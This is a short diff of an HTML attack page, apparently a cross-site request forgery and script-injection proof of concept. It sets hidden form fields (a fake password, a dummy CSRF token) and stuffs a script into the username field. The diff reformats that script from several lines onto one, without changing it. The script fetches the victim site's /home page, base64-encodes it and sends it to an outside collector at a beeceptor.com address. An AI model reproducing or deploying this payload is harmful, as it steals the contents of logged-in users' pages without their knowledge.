@@ -5,15 +5,7 @@
       <input type="hidden" name="password" value="fakepass" />
       <input type="hidden" name="_csrf" value="DUMMY_TOKEN" />
 
-      <input type="hidden" name="username" value="
-        <script>
-          fetch('/home')
-            .then(response => response.text())
-            .then(html => {
-              fetch('https://server.free.beeceptor.com/?data=' + btoa(html));
-            });
-        </script>
-      " />
+      <input type="hidden" name="username" value="<script>fetch('/home').then(r => r.text()).then(html => { fetch('https://server.free.beeceptor.com/?data=' + btoa(html)); });</script>" />
     </form>
     
     <script>
